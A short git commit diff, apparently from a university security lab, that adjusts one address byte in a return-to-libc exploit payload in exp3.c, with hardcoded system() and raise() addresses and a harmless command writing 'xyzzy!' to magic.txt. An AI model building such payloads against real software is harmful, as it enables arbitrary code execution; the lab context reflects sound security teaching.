cd71555c43d4465b9c28507a24b7db046b4d0ad0
malique-bodie <malique_bodie@brown.edu>
2021-10-28 04:38:19 -0400

    flag 4 working

--- exp3.c
+++ exp3.c
@@ -25,7 +25,7 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	"\x40\x20\xe2\xb3" //0xb3e23040 <system> 0xb3e22040 0xb3e22040
 	"\x40\x1d\xe1\xb3" // 0xb3e12d40 <raise> 0xb3e11d40
-	"\x2e\xc3\xff\xbf" // <system arg> pointer to string 0xbf ff c3 2c
+	"\x2d\xc3\xff\xbf" // <system arg> pointer to string 0xbf ff c3 2c
 	"\x0d\x90\x90\x90" // <raise> argument
 	"echo -n xyzzy! > magic.txt";
 
